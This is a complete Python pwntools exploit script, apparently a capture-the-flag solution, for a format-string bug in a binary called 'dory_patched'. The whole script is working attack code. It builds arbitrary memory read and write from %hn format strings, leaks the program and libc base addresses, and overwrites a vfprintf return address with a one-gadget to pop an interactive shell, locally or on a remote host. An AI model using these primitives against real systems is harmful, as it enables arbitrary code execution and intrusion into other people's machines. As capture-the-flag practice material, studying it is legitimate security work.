from pwn import *

CMDLINE = ["./dory_patched"]

elf = ELF(CMDLINE[0], checksec=False)
libc = ELF("./libc-2.39.so", checksec=False)

context.arch = "amd64"

class Exploit:
    LOCAL_HOST = "localhost"
    LOCAL_PORT = 1234
    REMOTE_HOST = "seastars.boisson.homeip.net" 
    REMOTE_PORT = 40011

    argv = 0
    argv_off = 0x168
    def __init__(self) -> None:
        if args.REMOTE:
            self.io = remote(self.REMOTE_HOST, self.REMOTE_PORT)
        elif args.LOCAL:
            self.io = remote(self.LOCAL_HOST, self.LOCAL_PORT)
        else:
            self.io = process(CMDLINE)
            if args.DBG:
                print(self.io.pid)
                pause()
        self.io.recvuntil(b"Programme ")

    def send(self, buf: bytes):
        self.io.sendline(buf)
        self.io.recvuntil(b"Programme ")
        data = self.io.clean()[:-1]
        return data

    def read(self, addr: int):
        self.write(self.area_ptr, addr)
        data = self.set_area()
        self.set_argv()
        return data

    def write_one(self, addr: int, value: int):
        self.write(self.argv - 0xd8, value)
        p = flat({
            0: f"%*21$c%11$n".encode(),
            0x10: p64(addr)
        }, filler=b'\0')
        self.io.send(p)

    def write(self, addr: int, value: int):
        for i in range(4):
            v = (value >> (0x10 * i)) & 0xffff
            p = flat({
                0: f"%{v}c%11$hn".encode() if v else b"%11$hn",
                0x10: p64(addr + (i * 2))
            }, filler=b'\0')
            self.io.send(p)
            self.io.recvuntil(b"Programme ")
            self.io.clean()

    def read_buf(self, addr: int, size: int):
        data = b""
        cur = 0
        while (len(data) < size):
            tmp = self.read(addr + cur) + b'\0'
            cur += len(tmp)
            data += tmp
        print(data)

    def set_area(self):
        p = flat({
            0: f"%{(self.argv - 0x20) & 0xffff}c%11$hn".encode(),
            0x10: p64(self.argv - self.argv_off)
        }, filler=b'\0')
        self.io.send(p)
        self.io.recvuntil(b"Programme ")
        data = self.io.clean()[:-1]
        return data

    def set_argv(self):
        p = flat({
            0: f"%{self.argv & 0xffff}c%11$hn".encode(),
            0x10: p64(self.argv - self.argv_off)
        }, filler=b'\0')
        self.io.send(p)
        #self.io.sendline(b"%5$lln")
        self.io.recvuntil(b"Programme ")
        self.io.clean()

    def set_area_ptr(self):
        self.area_ptr = self.argv - 0x20

    def reset_argv(self):
        return self.send(b"%*5$c%5$hn")

    def interactive(self):
        self.io.interactive()

    def close(self):
        self.io.close()

io = Exploit()

# write argv value to argv using width trick
argv = u64(io.reset_argv().ljust(8, b'\0'))

assert argv > 0, "Failed to copy argv"

io.argv = argv
io.set_area_ptr()

io.argv_off = 0x158

print("argv @ %#x" % argv)

main_addr = argv - 0x100

elf.address = u64(io.read(main_addr).ljust(8, b'\0')) - elf.symbols.main
libc.address = u64(io.read(elf.symbols.got["printf"]).ljust(8, b'\0')) - libc.symbols.printf

print("elf_base  @ %#x" % elf.address)
print("libc_base @ %#x" % libc.address)

io.reset_argv()

vfprintf_internal_ret = argv - 0x240

gadget = (libc.address + 0x4d8d3) & 0xffffffff # libc.symbols["gets"] & 0xffffffff

assert gadget <= 0x7fffffff, "OVERFLOW DETECTED"

print("[+] Success: %#x" % gadget)

# partial overwrite of vfprintf return address to a one gadget
io.write_one(vfprintf_internal_ret, gadget)

io.interactive()
io.close()